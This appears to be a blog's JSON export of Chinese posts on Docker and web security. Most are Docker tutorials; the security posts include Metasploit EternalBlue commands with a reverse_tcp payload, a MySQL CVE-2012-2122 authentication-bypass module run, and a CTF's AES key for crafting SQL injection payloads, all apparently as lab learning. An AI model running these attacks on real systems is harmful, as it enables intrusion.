k vim-common x86_64 2:8.0.1763-15.el8 appstream 6.3 M vim-filesystem noarch 2:8.0.1763-15.el8 appstream 48 k which x86_64 2.21-12.el8 baseos 49 kTransaction Summary================================================================================Install 5 PackagesTotal download size: 7.8 MInstalled size: 30 MDownloading Packages:(1/5): gpm-libs-1.20.7-17.el8.x86_64.rpm 328 kB/s | 39 kB 00:00(2/5): vim-filesystem-8.0.1763-15.el8.noarch.rp 824 kB/s | 48 kB 00:00(3/5): which-2.21-12.el8.x86_64.rpm 876 kB/s | 49 kB 00:00(4/5): vim-enhanced-8.0.1763-15.el8.x86_64.rpm 4.9 MB/s | 1.4 MB 00:00(5/5): vim-common-8.0.1763-15.el8.x86_64.rpm 16 MB/s | 6.3 MB 00:00--------------------------------------------------------------------------------Total 3.1 MB/s | 7.8 MB 00:02warning: /var/cache/dnf/appstream-02e86d1c976ab532/packages/gpm-libs-1.20.7-17.el8.x86_64.rpm: Header V3 RSA/SHA256 Signature, key ID 8483c65d: NOKEYCentOS Linux 8 - AppStream 1.6 MB/s | 1.6 kB 00:00Importing GPG key 0x8483C65D: Userid : &quot;CentOS (CentOS Official Signing Key) &lt;security@centos.org&gt;&quot; Fingerprint: 99DB 70FA E1D7 CE22 7FB6 4882 05B5 55B3 8483 C65D From : /etc/pki/rpm-gpg/RPM-GPG-KEY-centosofficialKey imported successfullyRunning transaction checkTransaction check succeeded.Running transaction testTransaction test succeeded.Running transaction Preparing : 1/1 Installing : which-2.21-12.el8.x86_64 1/5 Installing : vim-filesystem-2:8.0.1763-15.el8.noarch 2/5 Installing : vim-common-2:8.0.1763-15.el8.x86_64 3/5 Installing : gpm-libs-1.20.7-17.el8.x86_64 4/5 Running scriptlet: gpm-libs-1.20.7-17.el8.x86_64 4/5 Installing : vim-enhanced-2:8.0.1763-15.el8.x86_64 5/5 Running scriptlet: vim-enhanced-2:8.0.1763-15.el8.x86_64 5/5 Running scriptlet: vim-common-2:8.0.1763-15.el8.x86_64 5/5 Verifying : gpm-libs-1.20.7-17.el8.x86_64 1/5 Verifying : vim-common-2:8.0.1763-15.el8.x86_64 2/5 Verifying : vim-enhanced-2:8.0.1763-15.el8.x86_64 3/5 Verifying : vim-filesystem-2:8.0.1763-15.el8.noarch 4/5 Verifying : which-2.21-12.el8.x86_64 5/5Installed: gpm-libs-1.20.7-17.el8.x86_64 vim-common-2:8.0.1763-15.el8.x86_64 vim-enhanced-2:8.0.1763-15.el8.x86_64 vim-filesystem-2:8.0.1763-15.el8.noarch which-2.21-12.el8.x86_64Complete!Removing intermediate container 614daf07d5b9 ---&gt; 05882b638556Step 7/15 : ENV MYPATH /usr/local ---&gt; Running in 6f9ed4aba243Removing intermediate container 6f9ed4aba243 ---&gt; 73f831aacc97Step 8/15 : WORKDIR $MYPATH ---&gt; Running in 061a96c81eabRemoving intermediate container 061a96c81eab ---&gt; 979f862d9edcStep 9/15 : ENV JAVA_HOME /usr/local/jdk-8u301 ---&gt; Running in 4a4f4a989d55Removing intermediate container 4a4f4a989d55 ---&gt; 606ed59a4fa1Step 10/15 : ENV CLASSPATH $JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar ---&gt; Running in 489c658ba9b4Removing intermediate container 489c658ba9b4 ---&gt; b43e29dd6f13Step 11/15 : ENV CATALINA_HOME /usr/local/apache-tomcat-10.0.10 ---&gt; Running in 55dacf225f4dRemoving intermediate container 55dacf225f4d ---&gt; 8a4dd8f3878bStep 12/15 : ENV CATALINA_BASH /usr/local/apache-tomcat-10.0.10 ---&gt; Running in 896ab8940179Removing intermediate container 896ab8940179 ---&gt; 480c915facd1Step 13/15 : ENV PATH $PATH:$JAVA_HOME/bin:$CATALINA_HOME/lib:$CATALINA_HOME/bin ---&gt; Running in 170db3cfd12aRemoving intermediate container 170db3cfd12a ---&gt; ac5dfb75ad04Step 14/15 : EXPOSE 8080 ---&gt; Running in dd55e8c200aaRemoving intermediate container dd55e8c200aa ---&gt; 953bd5a52b36Step 15/15 : CMD /usr/local/apache-tomcat-10.0.10/bin/startup.sh &amp;&amp; tail -F /usr/local/apache-tomcat-10.0.10/logs/catalina.out ---&gt; Running in e8f0c4722972Removing intermediate container e8f0c4722972 ---&gt; ec6d3a066471Successfully built ec6d3a066471Successfully tagged diytomcat:latest 4、启动镜像&emsp;&emsp;docker run -d -p 9090:8080 --name xdddiytomcat -v /home/tomcat/test:/usr/local/apache-tomcat-10.0.10/webapps/test -v /home/tomcat/tomcatlogs/:/usr/local/apache-tomcat-10.0.10/logs diytomcat 5、测试访问&emsp;&emsp;添加入站规则 &emsp;&emsp;测试访问，但是发现出错了 [root@VM-0-15-centos tomcat]curl localhost:9090curl: (56) Recv failure: connection reset by peer &emsp;&emsp;进入容器查看日志，发现jdk的启动路径写错了。导致当我启动tomcat启动不起来 &emsp;&emsp;那就将错就错，进入容器把目录名字改成我设置的错的名字就能找到目录了，设置好后重启容器，再次访问即可 [root@VM-0-15-centos tomcat]# docker exec -it 717 /bin/bash[root@717d4ac1437a local]# lsapache-tomcat-10.0.10 bin etc games include jdk1.8.0_301 lib lib64 libexec readme.txt sbin share src[root@717d4ac1437a local]# mv jdk1.8.0_301 jdk-8u301[root@717d4ac1437a local]# exit[root@VM-0-15-centos tomcat]# docker restart 717717[root@VM-0-15-centos tomcat]# curl localhost:9090 &emsp;&emsp;注意：因为我这里Dockerfile就写错了，生成出来的镜像的路径肯定每次也是错的，因此最好重写Dockerfile重新生成镜像，避免每次都要修改路径才能启动tomcat 6、发布项目&emsp;&emsp;由于做了卷挂载，我们直接在本地编写项目就可以发布了 [root@VM-0-15-centos tomcat]cd /home[root@VM-0-15-centos home]# lsceshi mysql tomcat www[root@VM-0-15-centos home]# cd tomcat[root@VM-0-15-centos tomcat]# lstest tomcatlogs[root@VM-0-15-centos tomcat]# cd test[root@VM-0-15-centos test]# mkdir WEB-INF[root@VM-0-15-centos test]# cd WEB-INF/[root@VM-0-15-centos WEB-INF]# vim web.xml &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;web-app xmlns=&quot;http://java.sun.com/xml/ns/javaee&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd&quot; version=&quot;2.5&quot;&gt;&lt;/web-app&gt;[root@VM-0-15-centos WEB-INF]# cd ..[root@VM-0-15-centos test]# lsWEB-INF[root@VM-0-15-centos test]# vim index.jsp&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;Hello，小叮当&lt;/title&gt;&lt;/head&gt;&lt;body&gt;Hello World!&lt;br/&gt;&lt;%out.println(&quot;你的 IP 地址 &quot; + request.getRemoteAddr());System.out.println(&quot;----my test web logs----&quot;);%&gt;&lt;/body&gt;&lt;/html&gt; &emsp;&emsp;访问成功http://IP地址:9090/test &emsp;&emsp;查看日志文件，也能看到响应记录 [root@VM-0-15-centos tomcat]# cd tomcatlogs[root@VM-0-15-centos tomcatlogs]# lscatalina.2021-09-04.log catalina.out localhost.2021-09-04.log localhost_access_log.2021-09-04.txt[root@VM-0-15-centos tomcatlogs]# cat catalina.out","categories":[{"name":"docker","slug":"docker","permalink":"https://wolke.cn/categories/docker/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://wolke.cn/tags/docker/"}],"author":"w01ke"},{"title":"容器数据卷","slug":"容器数据卷","date":"2021-12-13T11:51:54.000Z","updated":"2022-01-03T03:18:14.825Z","comments":true,"path":"post/dbe3c4ee.html","link":"","permalink":"https://wolke.cn/post/dbe3c4ee.html","excerpt":"","text":"一、什么是容器数据卷docker的理念回顾 总结一句话：容器的持久化和同步操作！容器间也是可以数据共享的 二、使用数据卷&emsp;&emsp;直接使用命令来挂载 docker run -it -v 主机目录:容器内目录#测试[root@VM-0-15-centos ~]# docker run -it -v /home/ceshi:/home centos /bin/bash#启动起来时我们可以通过 docker inspect 容器id 查看挂载情况[root@VM-0-15-centos ~]# cd /home[root@VM-0-15-centos home]# ls ceshi[root@VM-0-15-centos home]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESaa5de9eebf5e centos &quot;/bin/bash&quot; 2 minutes ago Up 2 minutes zen_bohrd93e31b351d5 portainer/portainer &quot;/portainer&quot; 46 hours ago Up 46 hours 0.0.0.0:8088-&gt;9000/tcp, :::8088-&gt;9000/tcp romantic_kepler64dc6975f6e4 tomcat &quot;catalina.sh run&quot; 47 hours ago Up 47 hours 0.0.0.0:3355-&gt;8080/tcp, :::3355-&gt;8080/tcp tomcat01d0850b4943fc nginx &quot;/docker-entrypoint.…&quot; 2 days ago Up 2 days 0.0.0.0:3344-&gt;80/tcp, :::3344-&gt;80/tcp nginx01[root@VM-0-15-centos home]# docker inspect aa5d 三、实战：安装MySQL&emsp;&emsp;通过官方文档，可以看到安装启动MySQL，需要配置密码，这是要注意的！ #启动MySQL[root@VM-0-15-centos ~]# docker run -d -p 3310:3306 -v /home/mysql/conf:/etc/mysql/conf.d -v /home/mysql/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 --name=mysql01 mysql863db62d897742e0e62d6c8a4ef9507b00bc1b56071e7768920f645995e4b3f6#-d 后台运行#-p 端口映射#-v 卷挂载#-e 环境配置#--name 容器名字 &emsp;&emsp;注意安全组设置可以访问3310端口 &emsp;&emsp;使用连接工具，可以看到连接服务器内容器的mysql成功 &emsp;&emsp;在本地测试创建一个数据库，查看一下我们的映射路径是否ok 一开始是没有test数据库的，我们创建一个test数据库 再次查看目录，可以看到有test目录 &emsp;&emsp;即使把容器删除，发现我们挂载到本地的数据卷依然没有丢失，这就实现了容器数据持久化功能 四、匿名挂载和具名挂载1、匿名挂载&emsp;&emsp;只指定容器内，未指定容器外 &emsp;&emsp;docker run -d -P --name nginx01 -v /etc/nginx nginx -v 容器内路径 不去写主机上的路径，会自动创建一个路径 -P 大写的P，随机指定端口 &emsp;&emsp;docker volume命令 &emsp;&emsp;能够发现卷的名称是一串字符，这种就是匿名挂载 &emsp;&emsp;在 -v 的时候只写了容器内的路径，没有写容器外的路径 2、具名挂载&emsp;&emsp;通过 -v 卷名:容器内路径 来为卷命名 &emsp;&emsp;docker run -d -P --name nginx02 -v juming-nginx:/etc/nginx nginx &emsp;&emsp;查看卷名具体位置：docker volume inspect juming-nginx &emsp;&emsp;所有的 docker 容器内的卷，没有指定目录的情况下都是在：**/var/lib/docker/volumes/xxxx/_data** &emsp;&emsp;我们通过具名挂载可以方便的找到我们的一个卷，大多数情况也是在使用具名挂载 &emsp;&emsp;那么问题来了，我们该如何确定是具名挂载还是匿名挂载，亦或是指定路径挂载呢？ -v 容器内路径 匿名挂载 -v 卷名:容器内路径 具名挂载 -v /宿主机路径:容器内路径 指定路径挂载 ，注意有/ 五、容器权限&emsp;&emsp;有时候我们会遇到这样的一个命令，路径后面跟着一个 ro 或 rw docker run -d -P --name nginx02 -v juming-nginx:/etc/nginx:ro nginxdocker run -d -P --name nginx02 -v juming-nginx:/etc/nginx:rw nginx &emsp;&emsp;一旦设置了容器的权限，容器对我们挂载出来的内容就有限定了 &emsp;&emsp;只要看到 ro 就说明这个挂载路径只能通过宿主机来操作，容器内部是无法操作的，容器权限默认为 rw ro readonly，只读 rw readwrite，可读可写","categories":[],"tags":[],"author":"w01ke"},{"title":"docker commit镜像","slug":"docker-commit镜像","date":"2021-12-13T11:50:29.000Z","updated":"2022-01-03T03:25:40.463Z","comments":true,"path":"post/1c96de95.html","link":"","permalink":"https://wolke.cn/post/1c96de95.html","excerpt":"","text":"命令：docker commit #提交容器成为一个新的副本 #命令和git原理类似docker commit -a=&quot;作者&quot; -m=&quot;提交的描述信息&quot; 容器id 目标镜像名[:TAG] 实战测试 #启动一个默认的docker#发现这个默认的tomcat是没有webapps应用，镜像的原因，官方的镜像默认webapps下面是没有文件的#我自己从webapps.dist拷贝进webapps了基本文件#将我们操作过的容器通过commit提交为一个镜像！我们以后就使用我们修改过的镜像即可","categories":[{"name":"docker","slug":"docker","permalink":"https://wolke.cn/categories/docker/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://wolke.cn/tags/docker/"}],"author":"w01ke"},{"title":"docker镜像讲解","slug":"docker镜像讲解","date":"2021-12-13T11:47:12.000Z","updated":"2022-01-03T03:26:33.894Z","comments":true,"path":"post/9e39f1c0.html","link":"","permalink":"https://wolke.cn/post/9e39f1c0.html","excerpt":"","text":"一、镜像是什么&emsp;&emsp;镜像是一种轻量级、可执行的独立软件包，用来打包软件运行环境和基于运行环境开发的软件，它包含运行某个软件所需的所有内容，包括代码、运行时、库、环境变量和配置文件。 &emsp;&emsp;所有的应用，直接打包docker镜像，就可以直接跑起来 &emsp;&emsp;如何得到镜像： 从远程仓库下载 朋友拷贝给你 自己制作一个镜像DockerFile 二、Docker镜像加载原理1、UnionFS（联合文件系统）&emsp;&emsp;UnionFS (联合文件系统) : Union文件系统( UnionFS)是一种分层、 轻量级并且高性能的文件系统，它支持对文件系统的修改作为一次提交来一层层的叠加，同时可以将不同目录挂载到同一个虚拟文件系统下（unite several directories into a single virtual filesystem）。Union文件系统是Docker镜像的基础。镜像可以通过分层来进行继承，基于基础镜像（没有父镜像）,可以制作各种具体的应用镜像。 &emsp;&emsp;特性：一次同时加载多个文件系统，但从外面看起来，只能看到一个文件系统，联合加载会把各层文件系统叠加起来，这样最终的文件系统会包含所有底层的文件和目录 &emsp;&emsp;我们下载镜像的时候看到的一层层就是这个 2、Docker镜像加载原理&emsp;&emsp;Docker的镜像实际上由一层一层的文件系统组成，这种层级的文件系统UnionFS。 &emsp;&emsp;BootFS（Boot File System）主要包含bootloader和kernel，bootloader主要是引|导加载kernel，Linux刚启动时会加载BootFS文件系统，在Docker镜像的最底层是bootfs。这一层与我们典型的Linux/Unix系统是一样的，包含boot加载器和内核。当boot加载完成之后整个内核就都在内存中了，此时内存的使用权已由BootFS转交给内核，此时系统也会卸载bootfs. &emsp;&emsp;RootFS (Root File System) ，在bootfs之上。包含的就是典型Linux 系统中的/dev， /proc， /bin， /etc等标准目录和文件。RootFS就是各种不同的操作系统发行版，比如Ubuntu，Centos等等。 &emsp;&emsp;平时我们安装进虚拟机的CentOS都是好几个G，为什么Docker这里才200M？ &emsp;&emsp;对于一个精简的OS，RootfFS可以很小，只需要包含最基本的命令，工具和程序库就可以了，因为底层直接用Host的kernel，自己只需要提供RootFS就可以了。由此可见对于不同的linux发行版，BootFS基本是一致的，RootFS会有差别，因此不同的发行版可以公用BootFS。 3、分层理解（1）分层的镜像&emsp;&emsp;我们可以去下载一个镜像，注意观察下载的日志输出，可以看到是一层一层的在下载！ &emsp;&emsp;思考：为什么Docker镜像要采用这种分层的结构呢？ &emsp;&emsp;最大的好处，我觉得莫过于是资源共享了！比如有多个镜像都从相同的Base镜像构建而来，那么宿主机只需在磁盘上保留一份base镜像，同时内存中也只需要加载一份base镜像，这样就可以为所有的容器服务了，且镜像的每一层都可以被共享。 &emsp;&emsp;查看镜像分层的方式可以通过docker image inspect 镜像名命令！ （2）理解&emsp;&emsp;所有的Docker镜像都起始于一个基础镜像层，当进行修改或增加新的内容时，就会在当前镜像层之上，创建新的镜像层。 &emsp;&emsp;举一个简单的例子，假如基于Ubuntu Linux 16.04创建一个新的镜像，这就是新镜像的第一层；如果在该镜像中添加Python包，就会在基础镜像层之上创建第二个镜像层；如果继续添加一个安全补丁，就会创建第三个镜像层。 &emsp;&emsp;该镜像当前已经包含3个镜像层，如下图所示（这只是一个用于演示的很简单的例子） &emsp;&emsp;在添加额外的镜像层的同时,镜像始终保持是当前所有镜像的组合，理解这一点点常重要。 图中举了一个简单的例子，每个镜像包含3个文件，而镜像包含了来自两个镜像层的6个文件。 &emsp;&emsp;上图中的镜像层跟之前图中的略有区别，主要目的是便于展示文件。下图中展示了一个稍微复杂的三层镜像，在外部看来整个镜像只有6个文件，这是因为最上层中的文件7是文件5的一个更新版本。 &emsp;&emsp;这种情况下，上层镜像层中的文件覆盖了底层镜像层中的文件。这样就使得文件的更新版本作为一个新镜像层添加到镜像当中。 &emsp;&emsp;Docker通过存储引擎（新版本采用快照机制）的方式来实现镜像层堆栈,，保证多镜像层对外展示为统一的文件系统。 &emsp;&emsp;Linux上可用的存储引擎有AUFS、Overlay2、Device Mapper、Btrfs以及ZFS。顾名思义，每种存储引擎都基于Linux中对应的文件系统或者块设备技术，并且每种存储引擎擎都有其独有的性能特点。 &emsp;&emsp;Docker在Windows上仅支持windowsfilter一种存储引擎，该引擎基于NTFS文件系统之上实现了分层和CoW[1]。 &emsp;&emsp;下图展示了与系统显示相同的三层镜像。所有镜像层堆叠并合并，对外提供统一的视图。 （3）特点&emsp;&emsp;Docker镜像都是只读的，当容器启动时，一个新的可写层被加载到镜像的顶部！ &emsp;&emsp;这一层就是我们通常说的容器层，容器之下的都叫镜像层！","categories":[],"tags":[],"author":"w01ke"},{"title":"Portainer可视化面板安装","slug":"Portainer可视化面板安装","date":"2021-12-13T11:45:23.000Z","updated":"2022-01-03T03:29:03.443Z","comments":true,"path":"post/2f19e9de.html","link":"","permalink":"https://wolke.cn/post/2f19e9de.html","excerpt":"","text":"Rancher（CI/CD再用） Portainer（先用这个） docker run -d -p 8088:9000 --restart=always -v /var/run/docker.sock:/var/run/docker.sock --privileged=true portainer/portainer[root@VM-0-15-centos ~]# docker run -d -p 8088:9000 --restart=always -v /var/run/docker.sock:/var/run/docker.sock --privileged=true portainer/portainerd93e31b351d5e51dd006ab068e99507ce92185b4b6c8cc5aea6babb0e81b716f[root@VM-0-15-centos ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESd93e31b351d5 portainer/portainer &quot;/portainer&quot; 7 seconds ago Up 6 seconds 0.0.0.0:8088-&gt;9000/tcp, :::8088-&gt;9000/tcp romantic_kepler64dc6975f6e4 tomcat &quot;catalina.sh run&quot; 52 minutes ago Up 52 minutes 0.0.0.0:3355-&gt;8080/tcp, :::3355-&gt;8080/tcp tomcat01d0850b4943fc nginx &quot;/docker-entrypoint.…&quot; 15 hours ago Up 15 hours 0.0.0.0:3344-&gt;80/tcp, :::3344-&gt;80/tcp nginx01 访问8088端口，创建账户 我们选择local即可 可以管理docker","categories":[{"name":"docker","slug":"docker","permalink":"https://wolke.cn/categories/docker/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://wolke.cn/tags/docker/"}],"author":"w01ke"},{"title":"加密编码算法","slug":"加密编码算法","date":"2021-12-13T11:22:59.000Z","updated":"2022-01-03T03:24:22.931Z","comments":true,"path":"post/57602181.html","link":"","permalink":"https://wolke.cn/post/57602181.html","excerpt":"","text":"一、前言&emsp;&emsp;在渗透测试中，常见的密码等敏感信息会采用加密处理，其中作为安全测试人员必须要了解常见的加密方式，才能为后续的安全测试做好准备，本次课程将讲解各种加密编码等知识，便于后期的学习和发展 二、常见加密编码等算法解析&emsp;&emsp;MD5，SHA，ASC，进制，时间戳，URL，BASE64，Unescape，AES，DES等 1、MD5（不可逆）&emsp;&emsp;16位和32位，加密密文字符串由A-F,0-9随机分配，80%网站管理员或用户密码加采取MD5加密。(不可逆) &emsp;&emsp;网上的MD5在线工具，它的解密过程是用了枚举方法 2、SHA&emsp;&emsp;由A-Z，0-9随机组合，SHA1，SHA256，SHA384，SHA512长度固定。(不可逆） 3、进制&emsp;&emsp;16进制加密 4、Unix时间戳&emsp;&emsp;网站或者服务器脚本语言里经常会使用，会在数据库里用户登录和注销，注册里会使用 5、URL&emsp;&emsp;浏览器只做一次加密，在渗透绕过的时候可能会使用二次，三次加密方式 6、Base64&emsp;&emsp;大小写随机组合，在字符串后面经常出现一个或两个等号 &emsp;&emsp;明文越长，密文越长 &emsp;&emsp;常见应用：代码、密码、参数 &emsp;&emsp;浏览器只做一次加密，在渗透绕过的时候可能会使用二次，三次加密方式 7、Unescape&emsp;&emsp;%u+4位数字，对应两位字符，主要应用WEB应用上 &emsp;&emsp;当明文字符数量为单数时 &emsp;&emsp;为双数时，最后一个为%u0000 &emsp;&emsp;通过单数和双数的比较也能侧面反映出，%u+4位数字对应两位字符 8、AES&emsp;&emsp;是一种安全的加密方式，涉及到密码，偏移量，数据块，填充，在加密时候涉及到4种随机性。解密难度大。用base64解密出来是乱码，有很大可能是AES加密。有时候/出现在字符串里面。比较注重安全和大型网站、安全比赛 9、DES&emsp;&emsp;类似于BASE64，有时候+会出现字符串里 三、常见加密形式算法解析&emsp;&emsp;直接加密，带salt，带密码，带偏移，带位数，带模式，带干扰，自定义组合等 四、常见解密方式（针对）&emsp;&emsp;枚举，自定义逆向算法，可逆向 五、了解常规加密算法的特性&emsp;&emsp;长度位数，字符规律，代码分析，搜索获取等 六、演示案例1、SQL注入漏洞测试（参数加密） 进入题目 使用御剑扫描该IP 在浏览器中输入该URL，发现使用PHP文件 访问该URL，下载压缩包并解压 得到解密源码 审计源码，发现是由两次base64加密得到。一次base64解密， 二次base64解密： &emsp;&emsp;选中对应模式：&emsp;&emsp;AES加密模式：CBC、数据块：128位、密码：ydhaqPQnexoaDuW3、偏移量：2018201920202021&emsp;&emsp;解密得出：1_mozhe 审计代码，最终得出值为：1 在SQL注入时，要将1 and 1=1或者其他payload共同按格式加密之后才可以进行","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://wolke.cn/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://wolke.cn/tags/Web%E5%AE%89%E5%85%A8/"}],"author":"w01ke"},{"title":"系统及数据库等","slug":"系统及数据库等","date":"2021-12-13T11:09:41.000Z","updated":"2022-01-30T14:52:46.171Z","comments":true,"path":"post/1f6ee220.html","link":"","permalink":"https://wolke.cn/post/1f6ee220.html","excerpt":"","text":"一、前言&emsp;&emsp;除去前期讲到过的搭建平台中间件，网站源码外，容易收到攻击的还有操作系统，数据库，第三方软件平台等，其中此类攻击也能直接影响到Web或服务器的安全，导致网站或服务器权限的获取 二、操作系统层面1、识别操作系统常见方法（1）根据网站识别a、通过文件路径的大小写判断&emsp;&emsp;随便通过谷歌语法搜索点php的网站 &emsp;&emsp;看到一个网站，进入看看，URL为：http://www.qingxin.com.cn/cn/index.php &emsp;&emsp;当把URL改为：http://www.qingxin.com.cn/cn/indeX.php，显示404，说明大小写敏感，应该是Linux操作系统 （2）TTL值判断（不推荐，有时不准确）&emsp;&emsp;不同的操作系统的默认TTL值是不同的， 所以我们可以通过TTL值来判断主机的操作系统，但是当用户修改了TTL值的时候，就会误导我们的判断，所以这种判断方式也不一定准确。下面是默认操作系统的TTL： 1、WINDOWS NT/2000 TTL：1282、WINDOWS 95/98 TTL：323、UNIX TTL：2554、LINUX TTL：645、WIN7 TTL：64 &emsp;&emsp;比如ping一下www.xiaodi8.com，可以发现TTL为109，与128最相近，因此判断为Windows NT/2000，事实上的确如此 （3）使用nmap等扫描工具&emsp;&emsp;nmap -O IP 2、操作系统区别及识别意义区别：网站路径、大小写、文件在两个系统之间的适用性，兼容性 识别意义：如果判断出是哪种操作系统，就会从操作系统所支持的漏洞类型下手 三、数据库层面小型数据库 Access中型数据库 MySQL大型数据库 Oracle、SQL Server 1、识别数据库类型常见方法（1）通过网站及操作系统识别a、常见的组合asp + access（Windows特有）php + mysqlaspx + mssql（Windows特有）jsp + mssql，oraclepython + mongodb................ （2）通过nmap等工具扫描端口&emsp;&emsp;常用的数据库默认端口号： 1，关系型数据库SQL Server --- 1433Oracle --- 1521MySQL --- 3306Sybase --- 5000DB2 --- 5000PostgreSQL --- 54322，NOSQL数据库Redis --- 6379Memcached --- 11211MongoDB --- 27017 2、数据库类型区别及识别意义&emsp;&emsp;每个数据库里面的安全机制，内部结构都有些许不一样，同样产生的漏洞也不一样。不同的数据库，攻击方法、漏洞类型及影响都有不同 3、数据库常见漏洞类型及攻击&emsp;&emsp;弱口令攻击：通过弱口令登录到数据库中，得到网站管理员数据信息，登录网站后台，进行修改 4、简述数据库层面漏洞影响范围&emsp;&emsp;通过漏洞，进行攻击，也可以获取数据库的相关权限，进行一系列的操作 四、第三方层面1、如何判断有哪些第三方平台和软件&emsp;&emsp;常见的第三方软件：Jboss，PHPmyadmin，vsftpd（用来搭建FTP服务的），teamview等 &emsp;&emsp;比如phpmyadmin的判定 通过网站扫描其目录来判定，如果网站探测不到，那就通过端口扫描。要多层次判断，不能仅限于端口扫描，根据不同的应用采取不同的方法。 如果nmap扫描不出来，可能是有第三方防护软件（安全狗）等拦截。还有可能是对方服务部署在内网。 2、简述为什么要识别第三方平台或软件&emsp;&emsp;通过识别第三方软件，来找出漏洞，从而进行渗透测试 3、简述第三方平台或软件安全测试的范围&emsp;&emsp;直接影响到权限 五、补充&emsp;&emsp;除去常规web安全及app安全测试外，类似服务器单一或复杂的其他服务（邮件，游戏，负载均衡等），也可以作为安全测试目标，此类目标测试原则只是少了web应用或其他安全问题，所以明确安全测试思路是很重要的 六、操作演示1、永恒之蓝漏洞演示（1）主机发现&emsp;&emsp;使用命令：arp-scan -l 进行主机发现，发现了IP地址为192.168.43.155的主机，即我的靶机 （2）扫描端口&emsp;&emsp;使用命令：nmap -sV -p- 192.168.43.155，可以看到目标主机开放了445端口 （3）永恒之蓝漏洞利用msf6 &gt; use exploit/windows/smb/ms17_010_eternalbluemsf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set payload windows/x64/meterpreter/reverse_tcp**msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set lhost 192.168.43.167msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set rhost 192.168.43.155msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; run （4）提权&emsp;&emsp;进入shell，发现已经是机器最高权限了 2、MySQL身份认证绕过 CVE-2012-2122 &emsp;&emsp;进入vulhub所在的文件夹，然后进入CVE-2012-2122的文件夹 &emsp;&emsp;布置并启动测试环境：docker-compose build docker-compose up -d &emsp;&emsp;靶机查看IP地址信息，使用Kali进行nmap扫描：nmap -sV -O 192.168.43.44 &emsp;&emsp;搜索MySQL漏洞攻击模块：search mysql &emsp;&emsp;利用模块：use auxiliary/scanner/mysql/mysql_authbypass_hashdump &emsp;&emsp;进行相关设置： set rhosts 192.168.43.44 set username root run &emsp;&emsp;关闭环境：docker-compose down 七、涉及资源&emsp;&emsp;https://github.com/hellogoldsnakeman/masnmapscan-V1.0 &emsp;&emsp;也是个扫描工具，但是功能没有nmap多但是更快，适合轻量级的工作","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://wolke.cn/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://wolke.cn/tags/Web%E5%AE%89%E5%85%A8/"}],"author":"w01ke"},{"title":"Web源码拓展","slug":"Web源码拓展","date":"2021-12-13T11:03:38.000Z","updated":"2022-01-03T03:30:45.132Z","comments":true,"path":"post/de8a59bf.html","link":"","permalink":"https://wolke.cn/post/de8a59bf.html","excerpt":"","text":"一、前言&emsp;&emsp;WEB 源码在安全测试中是非常重要的信息来源，可以用来代码审计漏洞也可以用来做信息突破口，其中 WEB 源码有很多技术需要简明分析。 比如：获取某 ASP 源码后可以采用默认数据库下载为突破，获取某其他脚本源码漏洞可以进行代码审计挖掘或分析其业务逻辑等，总之源码的获取将为后期的安全测试提供了更多的思路。 二、关于Web源码目录结构&emsp;&emsp;数据库配置文件，后台目录，模板目录，数据库目录等 index.php 根据文件后缀判定admin 网站后台路径data 数据相关目录install 安装目录member 会员目录template 模板目录(和网站相关的整体架构)data =&gt; confing.php 数据库配置文件，网站和数据库的通讯信息，连接账号密码，可以去连接对方数据库，从数据库去得到这个网站的源码里面涉及到的管理员的账号密码。 三、关于Web源码脚本类型&emsp;&emsp;ASP，PHP，ASPX，JSP，JAVAWEB等脚本类型源码安全问题 四、关于Web源码应用分类&emsp;&emsp;社交，论坛，门户，第三方，博客等不同的代码机制对应漏洞 &emsp;&emsp;开源，未开源问题， 框架非框架问题，关于CMS识别问题及后续等 &emsp;&emsp;拿到对方的源码或者判断这个网站的应用类型之后应该侧重在哪些漏洞上做文章 门户网站------------------------综合类漏洞电商------------------------------业务逻辑漏洞论坛------------------------------XSS漏洞博客------------------------------漏洞较少第三方---------------------------根据功能决定 五、关于Web源码其他说明1、框架与非框架&emsp;&emsp;如果对方网站采用的是框架开发的话那么你面对的就是寻找框架的漏洞，如果是非框架的话寻找的漏洞针对的是代码写出来的漏洞（代码审计） &emsp;&emsp;比如：thinkPHP漏洞 2、CMS识别（1）CMS的概念&emsp;&emsp;CMS是Content Management System的缩写，意为”内容管理系统”。 内容管理系统是企业信息化建设和电子政务的新宠，也是一个相对较新的市场。 内容管理系统组成要素 文档模板 脚本语言或标记语言 与数据库集成 （2）CMS识别方法① 人工识别&emsp;&emsp;直接看出来 ② CMS识别在线工具&emsp;&emsp;在线cms指纹识别：http://whatweb.bugscaner.com/look/ &emsp;&emsp;云悉：https://www.yunsee.cn/ ③ 工具使用字典 &emsp;&emsp;因为每个文件都有个特定的md5值，我们可以通过访问一个网站的文件，保存到本地后，查看该文件的md5值，和字典中的md5值进行比较，如果相同，说明该网站的cms对应字典上该条记录的cms &emsp;&emsp;查看文件MD5等值的命令 certutil -hashfile D:\\file.txt MD5certutil -hashfile D:\\file.txt SHA1certutil -hashfile D:\\file.txt SHA256 &emsp;&emsp;假设访问这个网站：http://192.168.1.105:8032/，尝试访问http://192.168.1.105:8032/favicon.ico ，的确存在该图标，将该图标文件保存到本地 